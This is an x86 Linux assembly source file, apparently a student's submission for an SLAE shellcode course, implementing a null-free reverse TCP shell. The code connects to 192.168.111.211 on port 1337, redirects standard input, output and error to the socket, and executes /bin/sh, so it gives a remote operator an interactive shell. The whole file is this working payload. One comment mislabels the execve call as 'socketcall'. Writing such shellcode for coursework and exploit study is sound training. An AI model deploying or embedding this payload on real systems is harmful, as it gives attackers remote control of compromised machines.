;
; SLAE Assignment 2: shell_reverse_tcp_nonull
; Tim Ip (SLAE-1017)
;

global _start

section .text

_start:

	;
	; int socketcall(int call, unsigned long *args)
	; socket(int domain, int type, int protocol)
	;

	xor ebx, ebx
	push ebx		; protocol=IP=0
	push 0x1 		; type=SOCK_STREAM=1
	push 0x2		; domain=AF_INET=2

	inc ebx			; EBX=call=SYS_SOCKET=1
	mov ecx, esp		; ECX=*args=$esp

	push byte 0x66		; EAX=socketcall=0x66
	pop eax
	cdq
	int 0x80
	xchg esi, eax		; move sockfd to esi

	;
	; int socketcall(int call, unsigned long *args)
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; *addr={sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("192.168.111.211")}
	;

	push 0xD36FA8C0		; addr.sin_addr=192.168.111.211 Reverse (C0.A8.6F.D3)
	push word 0x3905	; addr.sin_port=1337 big endian
	inc ebx	
	push word bx 		; addr.sa_family=AF_INET=2	
	mov ecx, esp		; ECX=*addr

	push 0x10		; addrlen=16
	push ecx		; *addr=ECX
	push esi 		; sockfd=ESI

	mov ecx, esp		; ECX=*args=$esp
	inc ebx			; EBX=call=SYS_CONNECT=3
 
	push byte 0x66
	pop eax			; EAX=socketcall=0x66
	int 0x80

	;
	; int dup2(int oldfd, int newfd);
	; dup2(ebx, {0,1,2})
	;

	mov ebx, esi		; EBX=ESI=sockfd
	xor ecx, ecx

duploop:

	mov al, 0x3f		; EAX=dup2=0x3f
	int 0x80
	inc ecx
	cmp cl, 0x3		; If ecx==3, then zeroflag=0, else zeroflag=nonzero
	jne duploop		; Loop if zeroflag!=0, then duploop


	;
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	;
	
	push edx		; Null terminiator
	push 0x68732f2f		; //sh
	push 0x6e69622f		; /bin
	mov ebx, esp		; EBX=*filename=ESP
	push edx
	mov edx, esp		; EDX=envp[]=NULL
	push ebx
	mov ecx, esp		; ECX=argv[]=ESP

	mov al, 0xb		; EAX=socketcall=0xb
	int 0x80
